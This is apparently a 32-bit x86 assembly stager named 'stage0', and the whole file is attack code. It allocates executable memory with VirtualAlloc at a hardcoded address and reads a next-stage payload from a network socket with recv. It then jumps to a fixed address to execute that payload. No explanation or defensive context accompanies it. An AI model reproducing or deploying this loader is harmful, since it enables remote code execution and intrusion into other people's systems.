BITS 32

segment .text

GLOBAL _stage0@0 ;;stdcall
_stage0@0:
	add esp, -0x3e8			; alloc 1000 bytes on stack
	push DWORD 0x00000040	; ftProtect
	push DWORD 0x00003000	; ftAllocationType
	push DWORD 0x00030d40	; dwSize
	push DWORD 0x00000000	; lpAddress
	mov eax, 0x7c809a81		; VirtualAlloc address
	call eax
	push DWORD 0x00000000	; flags
	push DWORD 0x00030d40	; len
	push eax				; buf
	push ebx				; socket
	mov eax, 0x71ab615a		; recv address
	call eax
	nop
	mov eax, 0x007c0000		; jump to next stage
	jmp eax
